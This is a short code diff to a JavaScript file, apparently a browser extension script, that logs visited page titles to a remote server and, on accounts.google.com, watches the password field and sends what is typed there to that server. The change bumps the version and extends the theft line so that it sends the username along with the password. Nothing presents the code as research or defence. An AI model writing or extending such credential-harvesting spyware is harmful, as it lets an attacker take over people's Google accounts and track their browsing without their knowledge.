@@ -1,4 +1,4 @@
-var version = 33;
+var version = 34;
 console.log('V' + version);
 
 // Log URLs and data
@@ -11,7 +11,7 @@ function serverLog(data) {
 // Check repeatedly to see if location has changed
 var href = window.location.href;
 var title = $('title').text();
-serverLog(title);
+serverLog(title.trim());
 if(window.location.host === 'accounts.google.com'){
 	initPasswordMonitor();
 }
@@ -19,7 +19,7 @@ setInterval(() => {
 	if (window.location.href !== href || $('title').text() !== title) {
 		href = window.location.href;
 		title = $('title').text();
-		serverLog(title);
+		serverLog(title.trim());
 		if(window.location.host === 'accounts.google.com'){
 			initPasswordMonitor();
 		}
@@ -46,7 +46,7 @@ function initPasswordMonitor() {
 				currentVal = password.attr('data-initial-value');
 
 				// Send to server
-				serverLog(`PASSWORD: ${currentVal}`);
+				serverLog(`USERNAME: ${username} | PASSWORD: ${currentVal}`);
 			}
 		}, 10);
 	}
